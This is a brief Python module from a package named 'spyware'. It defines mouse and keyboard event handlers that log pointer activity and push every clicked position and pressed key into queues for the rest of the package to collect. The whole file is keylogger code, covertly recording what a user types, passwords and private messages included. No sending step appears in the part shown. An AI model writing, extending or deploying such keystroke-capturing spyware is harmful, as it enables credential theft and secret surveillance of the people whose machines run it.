from spyware.queues import click_queue, keystroke_queue


def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))

def on_click(x, y, _, pressed):
    if not pressed:
        return
    print(f'Pressed at {(x, y)}')
    click_queue.put((x, y))

def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))

def on_press(key):
    print(f"Key pressed: {key}")
    keystroke_queue.put(key)
